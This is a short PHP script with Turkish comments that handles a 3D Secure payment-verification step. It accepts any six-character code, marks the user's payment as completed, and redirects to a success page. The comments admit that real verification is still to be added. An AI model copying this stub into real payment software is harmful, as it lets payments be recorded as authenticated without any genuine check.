<?php
session_start();

// Session kontrolü
if (!isset($_SESSION['userIdentifier'])) {
    header('Location: index.php');
    exit;
}

// Config dosyasını dahil et
require_once 'config.php';

// Veritabanı bağlantısı
try {
    $pdo = getDbConnection();
} catch(PDOException $e) {
    die('Veritabanı bağlantı hatası');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $verificationCode = $_POST['verification_code'] ?? '';
    $userIdentifier = $_SESSION['userIdentifier'];
    
    // Burada gerçek 3D Secure doğrulaması yapılır
    // Şimdilik basit bir kontrol yapıyoruz
    
    if (strlen($verificationCode) === 6) {
        // Ödeme durumunu completed yap
        $stmt = $pdo->prepare("UPDATE users SET payment_status = 'completed', updated_at = NOW() WHERE user_identifier = ?");
        $stmt->execute([$userIdentifier]);
        
        // Başarı sayfasına yönlendir
        header('Location: success.php');
        exit;
    } else {
        // Hata sayfasına yönlendir
        header('Location: 3dredirect.php?error=invalid_code');
        exit;
    }
}

// POST değilse ana sayfaya yönlendir
header('Location: index.php');
exit;
?>
